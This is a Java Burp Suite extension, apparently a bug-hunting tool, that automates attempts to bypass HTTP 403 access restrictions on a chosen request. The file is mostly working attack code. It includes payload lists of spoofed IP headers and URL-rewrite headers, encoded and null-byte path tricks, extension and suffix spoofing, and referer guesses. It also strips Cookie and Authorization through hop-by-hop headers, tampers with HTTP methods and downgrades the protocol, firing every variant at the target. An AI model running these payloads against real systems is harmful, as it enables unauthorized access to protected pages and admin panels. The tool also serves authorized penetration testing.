package com.bughunter;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider {

    private MontoyaApi api;
    private final BypassTableModel tableModel = new BypassTableModel();
    // Increased thread pool to 15 to handle the extra "Level 3" payloads efficiently
    private final ExecutorService executor = Executors.newFixedThreadPool(15);
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    // --- 1. BYPASS HEADERS ---
    private static final List<String> BYPASS_HEADERS = Arrays.asList(
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For", "X-Forwarded-Host",
            "X-Host", "X-Custom-IP-Authorization", "Client-IP", "X-Remote-IP",
            "X-Originating-IP", "Fastly-Client-IP", "True-Client-IP", "Referer",
            "X-Client-IP", "X-Real-IP", "X-Forwarded-Server", "X-Wap-Profile", "X-ProxyUser-Ip"
    );

    // --- 2. IP SPOOFING ---
    private static final List<String> IP_PAYLOADS = Arrays.asList(
            "127.0.0.1", "localhost", "0.0.0.0", "192.168.0.1", "10.0.0.1", "::1", "127.0.0.2"
    );

    // --- 3. PATH FUZZING (Advanced & Obfuscated) ---
    private static final List<String> PATH_PAYLOADS = Arrays.asList(
            "/.", "//", "/./", "/;", "/.;", "//;", "/..;/", "/%2e/", "/%2f", "/admin/.",
            "/%252e/", "/%ef%bc%8f", "/%u002e/", "%09", "%20", "%00" // Double Encode, Unicode, Null Byte
    );

    // --- 4. SUFFIX / EXTENSION SPOOFING ---
    private static final List<String> SUFFIX_PAYLOADS = Arrays.asList(
            "?", "??", "&", "#", "%09", "%20",
            ".json", ".css", ".png", ".js", ".html", ".ico", // Static file spoofing
            ";jsessionid=1337", ";type=a",
            "/", "/."
    );

    // --- 5. REFERER GUESS LIST ---
    private static final List<String> REFERER_GUESSES = Arrays.asList(
            "/", "/admin", "/dashboard", "/login", "/panel", "/console",
            "/manager", "/administrator", "/private", "/internal", "/sysadmin", "/auth"
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("403 Forbidden Buster (Level 3 - Research Edition)");

        SwingUtilities.invokeLater(() -> {
            JTable table = new JTable(tableModel);
            table.setFont(new Font("SansSerif", Font.PLAIN, 12));
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);

            UserInterface ui = api.userInterface();
            requestViewer = ui.createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = ui.createHttpResponseEditor(EditorOptions.READ_ONLY);

            table.getSelectionModel().addListSelectionListener(e -> {
                if (!e.getValueIsAdjusting()) {
                    int selectedRow = table.getSelectedRow();
                    if (selectedRow != -1) {
                        BypassResult result = tableModel.getResult(selectedRow);
                        requestViewer.setRequest(result.requestResponse.request());
                        responseViewer.setResponse(result.requestResponse.response());
                    } else {
                        requestViewer.setRequest(null);
                        responseViewer.setResponse(null);
                    }
                }
            });

            JPopupMenu popupMenu = new JPopupMenu();
            JMenuItem deleteItem = new JMenuItem("Delete Item");
            JMenuItem clearItem = new JMenuItem("Clear History");

            deleteItem.addActionListener(e -> {
                int selectedRow = table.getSelectedRow();
                if (selectedRow != -1) tableModel.removeRow(selectedRow);
            });
            clearItem.addActionListener(e -> tableModel.clear());
            popupMenu.add(deleteItem);
            popupMenu.addSeparator();
            popupMenu.add(clearItem);

            table.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseReleased(MouseEvent e) { handleContextMenu(e); }
                @Override
                public void mousePressed(MouseEvent e) { handleContextMenu(e); }
                private void handleContextMenu(MouseEvent e) {
                    if (e.isPopupTrigger()) {
                        int row = table.rowAtPoint(e.getPoint());
                        if (row != -1 && !table.isRowSelected(row)) {
                            table.setRowSelectionInterval(row, row);
                        }
                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
                    }
                }
            });

            JScrollPane tableScroll = new JScrollPane(table);
            JSplitPane bottomSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, requestViewer.uiComponent(), responseViewer.uiComponent());
            bottomSplit.setResizeWeight(0.5);
            JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, bottomSplit);
            mainSplit.setResizeWeight(0.3);

            api.userInterface().registerSuiteTab("403 Buster", mainSplit);
        });

        api.userInterface().registerContextMenuItemsProvider(this);
        api.logging().logToOutput("403 Buster Level 3 Loaded (Unfiltered).");
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        if (event.messageEditorRequestResponse().isEmpty()) return null;
        JMenuItem bypassItem = new JMenuItem("Bypass 403 Forbidden");
        MessageEditorHttpRequestResponse editor = event.messageEditorRequestResponse().get();
        bypassItem.addActionListener(l -> executor.submit(() -> startAttack(editor.requestResponse())));
        List<Component> menuList = new ArrayList<>();
        menuList.add(bypassItem);
        return menuList;
    }

    private void startAttack(HttpRequestResponse baseRequestResponse) {
        HttpRequest originalRequest = baseRequestResponse.request();
        String originalPath = originalRequest.path();
        String host = baseRequestResponse.httpService().host();
        boolean isSecure = baseRequestResponse.httpService().secure();
        String scheme = isSecure ? "https://" : "http://";

        api.logging().logToOutput("[-] Starting Level 3 Fuzzing for: " + originalPath);

        // --- PHASE 1: Header Poisoning (Standard) ---
        for (String header : BYPASS_HEADERS) {
            // A. IP Injection
            for (String ip : IP_PAYLOADS) {
                HttpRequest newReq = originalRequest.withHeader(HttpHeader.httpHeader(header, ip));
                sendAndLog(newReq, "Header: " + header + " val: " + ip, baseRequestResponse);
            }

            // B. Path Swapping
            if (header.contains("URL")) {
                HttpRequest swapReq = originalRequest
                        .withPath("/")
                        .withHeader(HttpHeader.httpHeader(header, originalPath));
                checkPathSwap(swapReq, "Path Swap: / + " + header, originalRequest.withPath("/"));
            }

            // C. Referer Logic
            if (header.equalsIgnoreCase("Referer")) {
                List<String> refererCandidates = new ArrayList<>();
                refererCandidates.add(scheme + host + originalPath); // Self

                String tempPath = originalPath;
                while (tempPath.lastIndexOf("/") > 0) { // Walk up
                    tempPath = tempPath.substring(0, tempPath.lastIndexOf("/"));
                    refererCandidates.add(scheme + host + tempPath);
                }

                for (String parent : REFERER_GUESSES) { // Dictionary
                    refererCandidates.add(scheme + host + parent);
                }

                for (String refUrl : refererCandidates) {
                    HttpRequest refReq = originalRequest.withHeader(HttpHeader.httpHeader(header, refUrl));
                    String shortDesc = "Referer: " + refUrl.replace(scheme + host, "");
                    sendAndLog(refReq, shortDesc, baseRequestResponse);
                }
            }
        }

        // --- PHASE 2: Hop-by-Hop Attack (NEW TECHNIQUE) ---
        // Tells the proxy to REMOVE critical headers before forwarding to backend
        List<String> hopHeaders = new ArrayList<>(BYPASS_HEADERS);
        hopHeaders.add("Cookie");
        hopHeaders.add("Authorization");

        for (String hop : hopHeaders) {
            // Payload: Connection: close, X-Forwarded-For
            HttpRequest hopReq = originalRequest.withHeader(HttpHeader.httpHeader("Connection", "close, " + hop));
            sendAndLog(hopReq, "Hop-By-Hop Strip: " + hop, baseRequestResponse);
        }

        // --- PHASE 3: Path Manipulation & Obfuscation ---
        for (String payload : PATH_PAYLOADS) {
            if (payload.startsWith("/")) {
                String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
                sendAndLog(originalRequest.withPath(payload + cleanOriginal), "Path Prefix: " + payload, baseRequestResponse);
            }
        }

        // --- PHASE 4: Case Switching (NEW TECHNIQUE) ---
        // Windows IIS / Java often treat /ADMIN same as /admin, but WAFs might not.
        String upperPath = originalPath.toUpperCase();
        if (!upperPath.equals(originalPath)) {
            sendAndLog(originalRequest.withPath(upperPath), "Case: UPPER", baseRequestResponse);
        }

        // --- PHASE 5: Method Tampering ---
        sendAndLog(originalRequest.withMethod("POST").withBody(""), "Method: POST", baseRequestResponse);
        sendAndLog(originalRequest.withMethod("TRACE"), "Method: TRACE", baseRequestResponse);
        sendAndLog(originalRequest.withMethod("HEAD"), "Method: HEAD", baseRequestResponse);

        HttpRequest overrideReq = originalRequest.withMethod("POST")
                .withHeader(HttpHeader.httpHeader("X-HTTP-Method-Override", "GET"));
        sendAndLog(overrideReq, "Method Override: POST + X-Header", baseRequestResponse);

        // --- PHASE 6: Suffix / Extension Spoofing ---
        for (String suffix : SUFFIX_PAYLOADS) {
            sendAndLog(originalRequest.withPath(originalPath + suffix), "Suffix: " + suffix, baseRequestResponse);
        }

        // --- PHASE 7: Protocol Downgrade (HTTP/1.0) ---
        try {
            String rawReq = originalRequest.toString();
            // Robust Regex for HTTP/1.1, HTTP/2, HTTP/3
            Pattern p = Pattern.compile("HTTP/\\d(\\.\\d)?");
            Matcher m = p.matcher(rawReq);
            if (m.find()) {
                String downgradedRaw = m.replaceFirst("HTTP/1.0");
                HttpRequest downgradedReq = HttpRequest.httpRequest(baseRequestResponse.httpService(), downgradedRaw);
                sendAndLog(downgradedReq, "Protocol: HTTP/1.0", baseRequestResponse);
            }
        } catch (Exception e) {
            api.logging().logToError("Protocol downgrade failed: " + e.getMessage());
        }
    }

    private void checkPathSwap(HttpRequest attackReq, String description, HttpRequest baselineReq) {
        try {
            HttpRequestResponse attackResponse = api.http().sendRequest(attackReq);
            short statusCode = attackResponse.response().statusCode();

            HttpRequestResponse baselineResponse = api.http().sendRequest(baselineReq);
            int attackLen = attackResponse.response().body().length();
            int baselineLen = baselineResponse.response().body().length();

            // Only log if different from homepage to avoid noise, but allow everything else
            if (Math.abs(attackLen - baselineLen) > 100) {
                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                        attackReq.method(), attackReq.url(), description, statusCode, attackLen, attackResponse
                )));
            }
        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    private void sendAndLog(HttpRequest request, String description, HttpRequestResponse original) {
        try {
            HttpRequestResponse response = api.http().sendRequest(request);
            short statusCode = response.response().statusCode();
            int length = response.response().bodyToString().length();

            // --- FILTER DISABLED: LOGS EVERYTHING (200, 403, 401, 500) ---
            SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                    request.method(), request.url(), description, statusCode, length, response
            )));

        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    static class BypassTableModel extends AbstractTableModel {
        private final List<BypassResult> results = new ArrayList<>();
        private final String[] columns = {"Method", "URL", "Technique", "Status", "Length"};
        public void addResult(BypassResult result) { results.add(result); fireTableRowsInserted(results.size() - 1, results.size() - 1); }
        public void clear() { results.clear(); fireTableDataChanged(); }
        public void removeRow(int rowIndex) { if (rowIndex >= 0 && rowIndex < results.size()) { results.remove(rowIndex); fireTableRowsDeleted(rowIndex, rowIndex); } }
        public BypassResult getResult(int rowIndex) { return results.get(rowIndex); }
        @Override public int getRowCount() { return results.size(); }
        @Override public int getColumnCount() { return columns.length; }
        @Override public String getColumnName(int column) { return columns[column]; }
        @Override public Object getValueAt(int rowIndex, int columnIndex) {
            BypassResult result = results.get(rowIndex);
            switch (columnIndex) {
                case 0: return result.method;
                case 1: return result.url;
                case 2: return result.technique;
                case 3: return result.status;
                case 4: return result.length;
                default: return "";
            }
        }
    }

    static class BypassResult {
        String method, url, technique;
        int status, length;
        HttpRequestResponse requestResponse;
        public BypassResult(String method, String url, String technique, int status, int length, HttpRequestResponse requestResponse) {
            this.method = method; this.url = url; this.technique = technique; this.status = status; this.length = length; this.requestResponse = requestResponse;
        }
    }
}